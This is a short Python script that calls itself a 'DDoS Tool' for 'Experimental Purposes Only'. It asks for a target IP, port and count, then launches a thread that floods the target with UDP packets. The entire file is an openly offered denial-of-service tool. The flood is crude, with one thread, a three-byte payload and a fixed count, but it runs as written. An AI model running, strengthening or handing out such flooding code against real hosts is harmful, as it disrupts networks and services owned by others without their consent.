#---[Imports]---
import sys
import os
import threading
import socket 
import time

#---[Globals]---
_ATTACK_COUNTER = 0
_ATTACK_MAX = 5

#---[Sockets]---
def make_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return sock

def send_data(sock, data, location):
    sock.sendto(bytes(data), location)

#---Main---
def attack(target_ip, target_port):
    global _ATTACK_COUNTER, _ATTACK_MAX
    
    sock = make_socket()

    print("Mounting Attack: ", end='')

    while _ATTACK_COUNTER < _ATTACK_MAX:
        send_data(sock, b'123', (target_ip,target_port))
        _ATTACK_COUNTER += 1
        print(".",end='')
    
    print()
    print("Attack Thread Successful!")

def main():
    global _ATTACK_MAX

    #Header Information
    os.system("clear")
    print("DDoS Tool")
    print("Experimental Purposes Only")
    print("GithubAlt/hisoka")
    print()
    
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    target_attack_max = input("Target Max: ")

    _ATTACK_MAX = int(target_attack_max)

    print()
    print()
    print("Launching Attack")
    threading.Thread(target=attack, args=(target_ip, target_port,)).start()
    

if __name__ == "__main__":
    main()
